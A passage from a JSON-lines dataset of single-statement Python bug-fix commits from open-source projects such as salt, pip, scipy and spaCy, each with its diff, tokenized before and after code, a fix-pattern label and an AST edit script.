. op , HostFromGpu ) and len ( var . owner . inputs ) == 1 and isinstance ( var . owner . inputs [ 0 ] , CudaNdarraySharedVariable ) : return load_shared_variable , ( var . owner . inputs [ 0 ] . get_value ( ) , ) else : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 76], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 45], 2], [\"Insert\", \"N1\", [\"identifier:var\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:owner\", \"T\"], 2]]"}
{"project": "salt", "commit_sha": "302ab060a75383b02e3b9eeef712f9857f71ffb5", "parent_sha": "e4c1c446de51b1fcb47f4ce689bd0857a0d531dd", "file_path": "saltcloud/cloud.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -914,7 +914,7 @@ class Map(Cloud):\n                 for vm_name, vm_details in vms.copy().iteritems():\n                     if vm_details == 'Absent':\n                         query_map[alias][driver].pop(vm_name)\n-                    elif vm_details['state'].lower() != 'running':\n+                    elif vm_details['state'].lower() != 'running' and vm_details['state'].lower() != 'active':\n                         query_map[alias][driver].pop(vm_name)\n                 if not query_map[alias][driver]:\n                     query_map[alias].pop(driver)\n", "before": "if vm_details == 'Absent' : query_map [ alias ] [ driver ] . pop ( vm_name ) elif vm_details [ 'state' ] . lower ( ) != 'running' : query_map [ alias ] [ driver ] . pop ( vm_name )", "after": "if vm_details == 'Absent' : query_map [ alias ] [ driver ] . pop ( vm_name ) elif vm_details [ 'state' ] . lower ( ) != 'running' and vm_details [ 'state' ] . lower ( ) != 'active' : query_map [ alias ] [ driver ] . pop ( vm_name )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 21, 4, 62], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 26, 3, 66], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'active'\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"subscript\", \"N5\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:lower\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"):)\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:vm_details\", \"T\"], 0], [\"Insert\", \"N5\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N5\", [\"string:'state'\", \"T\"], 2], [\"Insert\", \"N5\", [\"]:]\", \"T\"], 3]]"}
{"project": "salt", "commit_sha": "e687422a47f102a2c390aa1539067628b18a4fac", "parent_sha": "77101231f29258bf8bf3cf807b2e4ed8988163f4", "file_path": "salt/state.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -652,7 +652,7 @@ class State(object):\n             errors.append('Missing \"fun\" data')\n         if 'name' not in data:\n             errors.append('Missing \"name\" data')\n-        if not isinstance(data['name'], string_types):\n+        if data['name'] and not isinstance(data['name'], string_types):\n             err = ('The name {0} in sls {1} is not formed as a '\n                    'string but is a {2}').format(\n                            data['name'], data['__sls__'], type(data['name']))\n", "before": "if not isinstance ( data [ 'name' ] , string_types ) : err = ( 'The name {0} in sls {1} is not formed as a ' 'string but is a {2}' ) . format ( data [ 'name' ] , data [ '__sls__' ] , type ( data [ 'name' ] ) )", "after": "if data [ 'name' ] and not isinstance ( data [ 'name' ] , string_types ) : err = ( 'The name {0} in sls {1} is not formed as a ' 'string but is a {2}' ) . format ( data [ 'name' ] , data [ '__sls__' ] , type ( data [ 'name' ] ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 78], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"not_operator\", 3, 12, 3, 54], 2], [\"Insert\", \"N1\", [\"identifier:data\", \"T\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'name'\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3]]"}
{"project": "salt", "commit_sha": "22df8018cd66014b5bdc43a2b49126ad5c2ea520", "parent_sha": "e0c6c8c22a9f899d00963369bde21ed2cb1f8603", "file_path": "salt/client/ssh/__init__.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -698,7 +698,7 @@ class Single(object):\n             result = 'An Exception occured while executing {0}: {1}'.format(self.fun, exc)\n         # Mimic the json data-structure that \"salt-call --local\" will\n         # emit (as seen in ssh_py_shim.py)\n-        if 'local' in result:\n+        if isinstance(result, dict) and 'local' in result:\n             ret = json.dumps({'local': result['local']})\n         else:\n             ret = json.dumps({'local': {'return': result}})\n", "before": "if 'local' in result : ret = json . dumps ( { 'local' : result [ 'local' ] } ) else : ret = json . dumps ( { 'local' : { 'return' : result } } )", "after": "if isinstance ( result , dict ) and 'local' in result : ret = json . dumps ( { 'local' : result [ 'local' ] } ) else : ret = json . dumps ( { 'local' : { 'return' : result } } )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 60], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 29], 2], [\"Insert\", \"N1\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:result\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:dict\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "salt", "commit_sha": "97378d193749038e306a7e1b1e799ac58c790b1b", "parent_sha": "777df7653c7631ecc403940193a9f7c2c713cb9f", "file_path": "salt/cloud/clouds/linode.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -162,7 +162,7 @@ def get_ssh_key_filename(vm_):\n         default=config.get_cloud_config_value(\n             'ssh_pubkey', vm_, __opts__, search_global=False\n         ), search_global=False)\n-    if exists(expanduser(key_filename)):\n+    if key_filename is not None and exists(expanduser(key_filename)):\n         return expanduser(key_filename)\n     return None\n \n", "before": "if exists ( expanduser ( key_filename ) ) : return expanduser ( key_filename )", "after": "if key_filename is not None and exists ( expanduser ( key_filename ) ) : return expanduser ( key_filename )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 40], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 40], 2], [\"Insert\", \"N1\", [\"identifier:key_filename\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 3]]"}
{"project": "addons-vauxoo", "commit_sha": "43c71009029b90f015b60362c7fba934bfbbfcdf", "parent_sha": "d53f1e65d4192ba257ae85081a10ab8c4bf724b4", "file_path": "sale_uncommitted_product/model/sale.py", "project_url": "https://github.com/cloud9UG/addons-vauxoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class sale_order(osv.osv):\n         check = True\n         res = {}\n         for sol_brw in self.browse(cr, uid, id, context=context).order_line:\n-            if sol_brw.product_id:\n+            if sol_brw.product_id and sol_brw.product_id.type!=\"service\":\n                 from_uom_id = sol_brw.product_uom\n                 to_uom_id = sol_brw.product_id.uom_id\n                 qty = sol_brw.product_uom_qty\n", "before": "if sol_brw . product_id : from_uom_id = sol_brw . product_uom to_uom_id = sol_brw . product_id . uom_id qty = sol_brw . product_uom_qty", "after": "if sol_brw . product_id and sol_brw . product_id . type != \"service\" : from_uom_id = sol_brw . product_uom to_uom_id = sol_brw . product_id . uom_id qty = sol_brw . product_uom_qty", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 46], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 16, 3, 34], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"service\\\"\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:type\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:sol_brw\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:product_id\", \"T\"], 2]]"}
{"project": "condex", "commit_sha": "53a88eaa0d8a2650bd411332dd80f3671a9b472c", "parent_sha": "5322feccf7d046ae28ccb7d00a29cca282245015", "file_path": "managers/IndexCommandManager.py", "project_url": "https://github.com/R4stl1n/condex", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,7 +134,7 @@ class IndexCommandManager:\n                                             DatabaseManager.update_index_coin_model(iCoin.Ticker, iCoin.DesiredPercentage-percentageToAdd, iCoin.DistanceFromTarget, iCoin.Locked)\r\n \r\n                                 if isinstance(float(percentage),(float,int,complex,long)):\r\n-                                    if DatabaseManager.update_index_coin_model(coin.upper(), float(percentage), 0.0,0.0, lockCoin):\r\n+                                    if DatabaseManager.update_index_coin_model(coin.upper(), float(percentage), 0.0, lockCoin):\r\n \r\n                                         logger.info(\"Coin \" + coin.upper() + \" updated in index\")\r\n                                     else:\r\n", "before": "if DatabaseManager . update_index_coin_model ( coin . upper ( ) , float ( percentage ) , 0.0 , 0.0 , lockCoin ) : logger . info ( \"Coin \" + coin . upper ( ) + \" updated in index\" ) else : ", "after": "if DatabaseManager . update_index_coin_model ( coin . upper ( ) , float ( percentage ) , 0.0 , lockCoin ) : logger . info ( \"Coin \" + coin . upper ( ) + \" updated in index\" ) else : ", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"float:0.0\", 3, 117, 3, 120]], [\"Delete\", [\",:,\", 3, 120, 3, 121]]]"}
{"project": "saloon_frappe", "commit_sha": "7a5430fc2fd17428ad49b3fb5fe4a8f138e3be5c", "parent_sha": "6653f2e2a170c53c158979d5bd586e2db4d62946", "file_path": "frappe/widgets/search.py", "project_url": "https://github.com/gangadharkadam/saloon_frappe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ def search_widget(doctype, txt, query=None, searchfield=None, start=0,\n \t\t\tfrappe.response[\"values\"] = frappe.widgets.reportview.execute(doctype,\n \t\t\t\tfilters=filters, fields = get_std_fields_list(meta, searchfield or \"name\"),\n \t\t\t\tor_filters = or_filters, limit_start = start,\n-\t\t\t\tlimit_page_length=page_len, as_list=True, debug=1)\n+\t\t\t\tlimit_page_length=page_len, as_list=True)\n \n def get_std_fields_list(meta, key):\n \t# get additional search fields\n", "before": "frappe . response [ \"values\" ] = frappe . widgets . reportview . execute ( doctype , filters = filters , fields = get_std_fields_list ( meta , searchfield or \"name\" ) , or_filters = or_filters , limit_start = start , limit_page_length = page_len , as_list = True , debug = 1 )", "after": "frappe . response [ \"values\" ] = frappe . widgets . reportview . execute ( doctype , filters = filters , fields = get_std_fields_list ( meta , searchfield or \"name\" ) , or_filters = or_filters , limit_start = start , limit_page_length = page_len , as_list = True )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 45, 3, 46]], [\"Delete\", [\"identifier:debug\", 3, 47, 3, 52]], [\"Delete\", [\"=:=\", 3, 52, 3, 53]], [\"Delete\", [\"integer:1\", 3, 53, 3, 54]], [\"Delete\", [\"keyword_argument\", 3, 47, 3, 54]]]"}
{"project": "fuel", "commit_sha": "7b9f69e75fb97eec45f878c47c384319db3dead5", "parent_sha": "c846772ddd1d4182e62a75519f86279bdf1db4a7", "file_path": "fuel/datasets/hdf5.py", "project_url": "https://github.com/basveeling/fuel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -273,7 +273,7 @@ class H5PYDataset(Dataset):\n             self.data_sources = tuple(\n                 handle[source_name][subset] for source_name, subset in\n                 zip(self.sources, self.subsets))\n-            self._out_of_memory_close(handle)\n+            self._out_of_memory_close()\n         else:\n             self.data_sources = None\n \n", "before": "self . _out_of_memory_close ( handle )", "after": "self . _out_of_memory_close ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:handle\", 3, 39, 3, 45]]]"}
{"project": "pip", "commit_sha": "b4b5a25752431f591201dd737ab67e8b1ea2a6d6", "parent_sha": "8dd23eb2ccfbb8cd1d5e9da68c59883689352bda", "file_path": "tests/test_search.py", "project_url": "https://github.com/takluyver/pip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ def test_search():\n     reset_env()\n-    output = run_pip('search', 'pip', expect_error=True)\n+    output = run_pip('search', 'pip')\n     assert 'pip installs packages' in output.stdout\n \n \n", "before": "output = run_pip ( 'search' , 'pip' , expect_error = True )", "after": "output = run_pip ( 'search' , 'pip' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 1, 37, 1, 38]], [\"Delete\", [\"identifier:expect_error\", 1, 39, 1, 51]], [\"Delete\", [\"=:=\", 1, 51, 1, 52]], [\"Delete\", [\"true:True\", 1, 52, 1, 56]], [\"Delete\", [\"keyword_argument\", 1, 39, 1, 56]]]"}
{"project": "pip", "commit_sha": "9868bc38b01cc095967fd05feae6291f4ad328b2", "parent_sha": "7f1362412f1e81e91de5e4cc8683a68aba601209", "file_path": "setup.py", "project_url": "https://github.com/takluyver/pip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ from setuptools import setup\n here = os.path.abspath(os.path.dirname(__file__))\n \n def read(*parts):\n-    return codecs.open(os.path.join(here, *parts), 'r', 'utf8').read()\n+    return codecs.open(os.path.join(here, *parts), 'r').read()\n \n def find_version(*file_paths):\n     version_file = read(*file_paths)\n", "before": "return codecs . open ( os . path . join ( here , * parts ) , 'r' , 'utf8' ) . read ( )", "after": "return codecs . open ( os . path . join ( here , * parts ) , 'r' ) . read ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 55, 3, 56]], [\"Delete\", [\"string:'utf8'\", 3, 57, 3, 63]]]"}
{"project": "scipy", "commit_sha": "db04a4394814c2409e96a8790de829d7f02cf5a5", "parent_sha": "dc6b98d77440de17683b61a48bc325cb1948dcb1", "file_path": "scipy/sparse/base.py", "project_url": "https://github.com/GregoryEAllen/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -373,7 +373,7 @@ class spmatrix(object):\n             elif other == 1:\n                 return self.copy()\n             else:\n-                tmp = self.__pow__(self, other//2)\n+                tmp = self.__pow__(other//2)\n                 if (other % 2):\n                     return self * tmp * tmp\n                 else:\n", "before": "else : tmp = self . __pow__ ( self , other // 2 )", "after": "else : tmp = self . __pow__ ( other // 2 )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 36, 3, 40]], [\"Delete\", [\",:,\", 3, 40, 3, 41]]]"}
{"project": "sunpy", "commit_sha": "099a4963aa27d5a4da89418adec2affe38db9b18", "parent_sha": "bab691dc83a863ca155ecc9f63b8013b0eb4d6ca", "file_path": "sunpy/timeseries/sources/rhessi.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -87,7 +87,7 @@ class RHESSISummaryTimeSeries(GenericTimeSeries):\n \n         for item, frame in self.to_dataframe().items():\n             axes.plot_date(self.to_dataframe().index, frame.values, '-',\n-                           label=item, lw=2, **kwargs)\n+                           label=item, **kwargs)\n \n         axes.set_yscale(\"log\")\n         axes.set_xlabel(datetime.datetime.isoformat(self.to_dataframe().index[0])[0:10])\n", "before": "axes . plot_date ( self . to_dataframe ( ) . index , frame . values , '-' , label = item , lw = 2 , ** kwargs )", "after": "axes . plot_date ( self . to_dataframe ( ) . index , frame . values , '-' , label = item , ** kwargs )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:lw\", 3, 40, 3, 42]], [\"Delete\", [\"=:=\", 3, 42, 3, 43]], [\"Delete\", [\"integer:2\", 3, 43, 3, 44]], [\"Delete\", [\"keyword_argument\", 3, 40, 3, 44]], [\"Delete\", [\",:,\", 3, 44, 3, 45]]]"}
{"project": "chromium-trunk-build-override", "commit_sha": "7c5c3229e4ebc22ddbc5af74664ffaa89639799e", "parent_sha": "3a30d637a56ef825d209351fa07911fdf976a1be", "file_path": "android/emulator.py", "project_url": "https://github.com/lukeweber/chromium-trunk-build-override", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -196,7 +196,7 @@ class Emulator(object):\n-    a = android_commands.AndroidCommands(self.device, False)\n+    a = android_commands.AndroidCommands(self.device)\n     seconds_waited = 0\n     number_of_waits = 2  # Make sure we can wfd twice\n     adb_cmd = \"adb -s %s %s\" % (self.device, 'wait-for-device')\n", "before": "a = android_commands . AndroidCommands ( self . device , False )", "after": "a = android_commands . AndroidCommands ( self . device )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 0, 53, 0, 54]], [\"Delete\", [\"false:False\", 0, 55, 0, 60]]]"}
{"project": "enigma2", "commit_sha": "de92cb95b4d2faba2b1af467ae6b9193b3dec494", "parent_sha": "5b52d1f1a5e84d9f416537fc4fd4b6e0e0326612", "file_path": "lib/python/Screens/InstallWizard.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ class InstallWizard(Screen, ConfigListScreen):\n \t\t\tconfig.misc.installwizard.hasnetwork.value = False\n \t\t\tconfig.misc.installwizard.ipkgloaded.value = False\n \t\t\tmodes = {0: \" \"}\n-\t\t\tself.enabled = ConfigSelection(choices = modes, default = 0, graphic = False)\n+\t\t\tself.enabled = ConfigSelection(choices = modes, default = 0)\n \t\t\tself.adapters = [(iNetwork.getFriendlyAdapterName(x),x) for x in iNetwork.getAdapterList()]\n \t\t\tis_found = False\n \t\t\tfor x in self.adapters:\n", "before": "self . enabled = ConfigSelection ( choices = modes , default = 0 , graphic = False )", "after": "self . enabled = ConfigSelection ( choices = modes , default = 0 )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 63, 3, 64]], [\"Delete\", [\"identifier:graphic\", 3, 65, 3, 72]], [\"Delete\", [\"=:=\", 3, 73, 3, 74]], [\"Delete\", [\"false:False\", 3, 75, 3, 80]], [\"Delete\", [\"keyword_argument\", 3, 65, 3, 80]]]"}
{"project": "certbot", "commit_sha": "2f71b2c0bee4c2abd76f76cacd1a3cf2ac56c1e9", "parent_sha": "df49c661247ca1f8adb235e654332dc3fbf92616", "file_path": "letsencrypt/configuration.py", "project_url": "https://github.com/barkinet/certbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -148,7 +148,7 @@ def _check_config_domain_sanity(domains):\n     # Unicode\n     try:\n         for domain in domains:\n-            domain.encode('ascii',errors='strict')\n+            domain.encode('ascii')\n     except UnicodeDecodeError:\n         raise errors.ConfigurationError(\n             \"Internationalized domain names are not supported\")\n", "before": "domain . encode ( 'ascii' , errors = 'strict' )", "after": "domain . encode ( 'ascii' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 34, 3, 35]], [\"Delete\", [\"identifier:errors\", 3, 35, 3, 41]], [\"Delete\", [\"=:=\", 3, 41, 3, 42]], [\"Delete\", [\"string:'strict'\", 3, 42, 3, 50]], [\"Delete\", [\"keyword_argument\", 3, 35, 3, 50]]]"}
{"project": "certbot", "commit_sha": "5514776a7e42d246103c5ba029803e0f9791beb9", "parent_sha": "4a7a0bd47ad5bb110b3416eca850eee38e01b2c4", "file_path": "letsencrypt/cli.py", "project_url": "https://github.com/barkinet/certbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -761,7 +761,7 @@ def _set_by_cli(var):\n         if inst:\n             detector.namespace.__setattr__(\"installer\", inst)\n         # more spammy than just debug\n-        logger.log(-10, \"Default Detector is %r\", auth, inst, detector.namespace)\n+        logger.log(-10, \"Default Detector is %r\",detector.namespace)\n \n     try:\n         # Is detector.var something that isn't false?\n", "before": "logger . log ( - 10 , \"Default Detector is %r\" , auth , inst , detector . namespace )", "after": "logger . log ( - 10 , \"Default Detector is %r\" , detector . namespace )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:auth\", 3, 51, 3, 55]], [\"Delete\", [\",:,\", 3, 55, 3, 56]], [\"Delete\", [\"identifier:inst\", 3, 57, 3, 61]], [\"Delete\", [\",:,\", 3, 61, 3, 62]]]"}
{"project": "sympy", "commit_sha": "70681458044429eafa21f37710bf0fd8fd39590f", "parent_sha": "96259182f9fcc3a63609d401e412068e779618dc", "file_path": "sympy/core/sets.py", "project_url": "https://github.com/sampadsaha5/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1219,7 +1219,7 @@ def _complement(self):\n             raise ValueError(\"%s: Complement not defined for symbolic inputs\"\n                     %self)\n \n-        args = sorted(self.args, key=default_sort_key)\n+        args = sorted(self.args)\n \n         intervals = [] # Build up a list of intervals between the elements\n         intervals += [Interval(S.NegativeInfinity, args[0], True, True)]\n", "before": "args = sorted ( self . args , key = default_sort_key )", "after": "args = sorted ( self . args )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 32, 3, 33]], [\"Delete\", [\"identifier:key\", 3, 34, 3, 37]], [\"Delete\", [\"=:=\", 3, 37, 3, 38]], [\"Delete\", [\"identifier:default_sort_key\", 3, 38, 3, 54]], [\"Delete\", [\"keyword_argument\", 3, 34, 3, 54]]]"}
{"project": "scout", "commit_sha": "2f6c719acc695c239859986f9cf2f5592e8bebed", "parent_sha": "c1c45a1660d44bb949da4a6d27a50976f5c01cde", "file_path": "scout/server/blueprints/phenotypes/views.py", "project_url": "https://github.com/Clinical-Genomics/scout", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,5 +11,5 @@ hpo_bp = Blueprint('phenotypes', __name__, template_folder='templates')\n @templated('phenotypes/hpo_terms.html')\n def hpo_terms():\n     \"\"\"Render search box and view for HPO phenotype terms\"\"\"\n-    data = controllers.hpo_terms(store= store, limit=100)\n+    data = controllers.hpo_terms(store= store)\n     return data\n", "before": "data = controllers . hpo_terms ( store = store , limit = 100 )", "after": "data = controllers . hpo_terms ( store = store )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 46, 3, 47]], [\"Delete\", [\"identifier:limit\", 3, 48, 3, 53]], [\"Delete\", [\"=:=\", 3, 53, 3, 54]], [\"Delete\", [\"integer:100\", 3, 54, 3, 57]], [\"Delete\", [\"keyword_argument\", 3, 48, 3, 57]]]"}
{"project": "scout", "commit_sha": "35f94724554eeae089a2b70fd4453db2911cc7b1", "parent_sha": "119254d1d5bd4c79fa0ea36b1f8989bbc7b2de62", "file_path": "scout/server/blueprints/cases/views.py", "project_url": "https://github.com/Clinical-Genomics/scout", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -655,7 +655,7 @@ def status(institute_id, case_name):\n     link = url_for('.case', institute_id=institute_id, case_name=case_name)\n \n     if status == 'archived':\n-        store.archive_case(institute_obj, case_obj, user_obj, status, link)\n+        store.archive_case(institute_obj, case_obj, user_obj, link)\n     else:\n         store.update_status(institute_obj, case_obj, user_obj, status, link)\n \n", "before": "store . archive_case ( institute_obj , case_obj , user_obj , status , link )", "after": "store . archive_case ( institute_obj , case_obj , user_obj , link )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:status\", 3, 63, 3, 69]], [\"Delete\", [\",:,\", 3, 69, 3, 70]]]"}
{"project": "spaCy", "commit_sha": "5a14a13f64361a646fd747bef7e1c2bda532c679", "parent_sha": "2663f4133c28a7d294e35d8fe2215ffb9b5a7dae", "file_path": "spacy/lang/th/__init__.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class ThaiTokenizer(DummyTokenizer):\n         self.vocab = nlp.vocab if nlp is not None else cls.create_vocab(nlp)\n \n     def __call__(self, text):\n-        words = list(self.word_tokenize(text, \"newmm\"))\n+        words = list(self.word_tokenize(text))\n         spaces = [False] * len(words)\n         return Doc(self.vocab, words=words, spaces=spaces)\n \n", "before": "words = list ( self . word_tokenize ( text , \"newmm\" ) )", "after": "words = list ( self . word_tokenize ( text ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 45, 3, 46]], [\"Delete\", [\"string:\\\"newmm\\\"\", 3, 47, 3, 54]]]"}
{"project": "spaCy", "commit_sha": "b85bd63eca67b8e5171f7881d3311a11d3b244a7", "parent_sha": "5d605d539d097f6168d7d95869c9242290b87fd1", "file_path": "spacy/tests/test_cli.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -368,7 +368,7 @@ def test_parse_cli_overrides():\n @pytest.mark.parametrize(\"optimize\", [\"efficiency\", \"accuracy\"])\n def test_init_config(lang, pipeline, optimize):\n     # TODO: add more tests and also check for GPU with transformers\n-    config = init_config(\"-\", lang=lang, pipeline=pipeline, optimize=optimize, cpu=True)\n+    config = init_config(lang=lang, pipeline=pipeline, optimize=optimize, cpu=True)\n     assert isinstance(config, Config)\n \n \n", "before": "config = init_config ( \"-\" , lang = lang , pipeline = pipeline , optimize = optimize , cpu = True )", "after": "config = init_config ( lang = lang , pipeline = pipeline , optimize = optimize , cpu = True )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"string:\\\"-\\\"\", 3, 26, 3, 29]], [\"Delete\", [\",:,\", 3, 29, 3, 30]]]"}
{"project": "spaCy", "commit_sha": "2af741d7e3b96be4e24319c2e8284fa168c6ab99", "parent_sha": "142b58be92dbc1ee63d3424f7afaf4fe44cab417", "file_path": "spacy/cli/train.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -246,7 +246,7 @@ def create_evaluation_callback(\n ) -> Callable[[], Tuple[float, Dict[str, float]]]:\n     def evaluate() -> Tuple[float, Dict[str, float]]:\n         dev_examples = corpus.dev_dataset(\n-            nlp, gold_preproc=cfg[\"gold_preproc\"], ignore_misaligned=True\n+            nlp, gold_preproc=cfg[\"gold_preproc\"]\n         )\n         dev_examples = list(dev_examples)\n         n_words = sum(len(ex.predicted) for ex in dev_examples)\n", "before": "Callable [ [ ] , Tuple [ float , Dict [ str , float ] ] ] : def evaluate ( ) - > Tuple [ float , Dict [ str , float ] ] : dev_examples = corpus . dev_dataset ( nlp , gold_preproc = cfg [ \"gold_preproc\" ] , ignore_misaligned = True )", "after": "Callable [ [ ] , Tuple [ float , Dict [ str , float ] ] ] : def evaluate ( ) - > Tuple [ float , Dict [ str , float ] ] : dev_examples = corpus . dev_dataset ( nlp , gold_preproc = cfg [ \"gold_preproc\" ] )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 50, 3, 51]], [\"Delete\", [\"identifier:ignore_misaligned\", 3, 52, 3, 69]], [\"Delete\", [\"=:=\", 3, 69, 3, 70]], [\"Delete\", [\"true:True\", 3, 70, 3, 74]], [\"Delete\", [\"keyword_argument\", 3, 52, 3, 74]]]"}
